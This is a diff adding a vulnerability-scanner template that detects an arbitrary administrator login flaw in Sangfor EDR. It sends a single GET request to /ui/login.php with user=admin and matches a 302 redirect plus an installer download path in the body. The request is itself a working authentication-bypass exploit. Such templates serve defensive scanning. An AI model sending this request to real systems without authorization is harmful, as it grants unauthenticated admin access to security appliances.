@@ -1,0 +1,25 @@
+id: poc-yaml-sangfor-edr-arbitrary-admin-login
+
+info:
+  name: poc-yaml-sangfor-edr-arbitrary-admin-login
+  author: hilson
+  severity: critical
+  tags: xray-converted,ct-158513
+  reference:
+    - https://mp.weixin.qq.com/s/6aUrXcnab_EScoc0-6OKfA
+
+http:
+  - raw:
+      - |
+        GET /ui/login.php?user=admin HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: body
+        words:
+          - "/download/edr_installer_"
